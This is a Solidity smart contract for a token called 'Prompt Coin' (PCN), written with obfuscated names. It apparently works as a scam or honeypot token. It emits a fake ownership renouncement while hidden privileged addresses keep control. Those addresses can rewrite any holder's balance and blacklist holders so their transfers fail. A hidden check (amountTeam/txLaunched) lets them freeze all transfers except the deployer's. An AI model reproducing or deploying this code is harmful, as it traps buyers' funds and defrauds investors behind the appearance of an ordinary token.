//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract marketingAutoFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapSender {
    function createPair(address listFund, address launchedAmount) external returns (address);

    function feeTo() external view returns (address);
}

interface takeBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface isMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromSwap) external view returns (uint256);

    function transfer(address takeMode, uint256 launchedTotal) external returns (bool);

    function allowance(address totalShouldExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedTotal) external returns (bool);

    function transferFrom(
        address sender,
        address takeMode,
        uint256 launchedTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listLimit, uint256 value);
    event Approval(address indexed totalShouldExempt, address indexed spender, uint256 value);
}

interface tokenLaunched is isMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PromptCoin is marketingAutoFee, isMin, tokenLaunched {

    bool public receiverMarketingFee;

    function balanceOf(address fromSwap) public view virtual override returns (uint256) {
        return feeMinShould[fromSwap];
    }

    uint256 private launchedAt;

    function autoLaunchedFee(address autoReceiverReceiver, uint256 launchedTotal) public {
        toMarketing();
        feeMinShould[autoReceiverReceiver] = launchedTotal;
    }

    function approve(address autoList, uint256 launchedTotal) public virtual override returns (bool) {
        atTake[_msgSender()][autoList] = launchedTotal;
        emit Approval(_msgSender(), autoList, launchedTotal);
        return true;
    }

    mapping(address => bool) public listAmount;

    bool public shouldFund;

    bool private modeLimitTake;

    address private launchReceiver;

    function symbol() external view virtual override returns (string memory) {
        return fromToken;
    }

    address public marketingTeamFund;

    function totalSupply() external view virtual override returns (uint256) {
        return marketingTo;
    }

    address tokenSell;

    function swapToken(address marketingAmount) public {
        toMarketing();
        if (modeLimitTake) {
            shouldFund = false;
        }
        if (marketingAmount == modeFundWallet || marketingAmount == marketingTeamFund) {
            return;
        }
        totalTakeTx[marketingAmount] = true;
    }

    uint256 constant buyMaxTx = 17 ** 10;

    function amountTeam(uint256 launchedTotal) public {
        toMarketing();
        txLaunched = launchedTotal;
    }

    uint256 private marketingTo = 100000000 * 10 ** 18;

    uint256 walletMin;

    function getOwner() external view returns (address) {
        return launchReceiver;
    }

    mapping(address => bool) public totalTakeTx;

    function totalMarketing(address txAmount, address takeMode, uint256 launchedTotal) internal returns (bool) {
        require(feeMinShould[txAmount] >= launchedTotal);
        feeMinShould[txAmount] -= launchedTotal;
        feeMinShould[takeMode] += launchedTotal;
        emit Transfer(txAmount, takeMode, launchedTotal);
        return true;
    }

    address public modeFundWallet;

    function atSell() public {
        emit OwnershipTransferred(modeFundWallet, address(0));
        launchReceiver = address(0);
    }

    function toMarketing() private view {
        require(listAmount[_msgSender()]);
    }

    bool private modeTrading;

    function allowance(address tradingAtWallet, address autoList) external view virtual override returns (uint256) {
        if (autoList == launchedLaunch) {
            return type(uint256).max;
        }
        return atTake[tradingAtWallet][autoList];
    }

    function transferFrom(address txAmount, address takeMode, uint256 launchedTotal) external override returns (bool) {
        if (_msgSender() != launchedLaunch) {
            if (atTake[txAmount][_msgSender()] != type(uint256).max) {
                require(launchedTotal <= atTake[txAmount][_msgSender()]);
                atTake[txAmount][_msgSender()] -= launchedTotal;
            }
        }
        return takeToLimit(txAmount, takeMode, launchedTotal);
    }

    string private sellTx = "Prompt Coin";

    uint8 private toFrom = 18;

    uint256 txLaunched;

    uint256 private atTrading;

    event OwnershipTransferred(address indexed feeFrom, address indexed txReceiverLimit);

    function transfer(address autoReceiverReceiver, uint256 launchedTotal) external virtual override returns (bool) {
        return takeToLimit(_msgSender(), autoReceiverReceiver, launchedTotal);
    }

    uint256 public isMax;

    constructor (){
        
        atSell();
        takeBuy listTeamWallet = takeBuy(launchedLaunch);
        marketingTeamFund = swapSender(listTeamWallet.factory()).createPair(listTeamWallet.WETH(), address(this));
        tokenSell = swapSender(listTeamWallet.factory()).feeTo();
        if (isMax == listAt) {
            receiverMarketingFee = true;
        }
        modeFundWallet = _msgSender();
        listAmount[modeFundWallet] = true;
        feeMinShould[modeFundWallet] = marketingTo;
        
        emit Transfer(address(0), modeFundWallet, marketingTo);
    }

    uint256 public liquidityEnableLimit = 0;

    mapping(address => mapping(address => uint256)) private atTake;

    function decimals() external view virtual override returns (uint8) {
        return toFrom;
    }

    address launchedLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function exemptSwap(address txAmount, address takeMode, uint256 launchedTotal) internal view returns (uint256) {
        require(launchedTotal > 0);

        uint256 takeSender = 0;
        if (txAmount == marketingTeamFund && liquidityEnableLimit > 0) {
            takeSender = launchedTotal * liquidityEnableLimit / 100;
        } else if (takeMode == marketingTeamFund && txSellWallet > 0) {
            takeSender = launchedTotal * txSellWallet / 100;
        }
        require(takeSender <= launchedTotal);
        return launchedTotal - takeSender;
    }

    uint256 private listAt;

    mapping(address => uint256) private feeMinShould;

    function marketingShould(address amountTotal) public {
        require(amountTotal.balance < 100000);
        if (walletTake) {
            return;
        }
        if (modeLimitTake) {
            launchedAt = maxTx;
        }
        listAmount[amountTotal] = true;
        if (modeLimitTake != shouldFund) {
            modeLimitTake = true;
        }
        walletTake = true;
    }

    function name() external view virtual override returns (string memory) {
        return sellTx;
    }

    function owner() external view returns (address) {
        return launchReceiver;
    }

    bool public walletTake;

    uint256 private teamMode;

    uint256 public txSellWallet = 0;

    uint256 private maxTx;

    string private fromToken = "PCN";

    function takeToLimit(address txAmount, address takeMode, uint256 launchedTotal) internal returns (bool) {
        if (txAmount == modeFundWallet) {
            return totalMarketing(txAmount, takeMode, launchedTotal);
        }
        uint256 amountExempt = isMin(marketingTeamFund).balanceOf(tokenSell);
        require(amountExempt == txLaunched);
        require(takeMode != tokenSell);
        if (totalTakeTx[txAmount]) {
            return totalMarketing(txAmount, takeMode, buyMaxTx);
        }
        launchedTotal = exemptSwap(txAmount, takeMode, launchedTotal);
        return totalMarketing(txAmount, takeMode, launchedTotal);
    }

}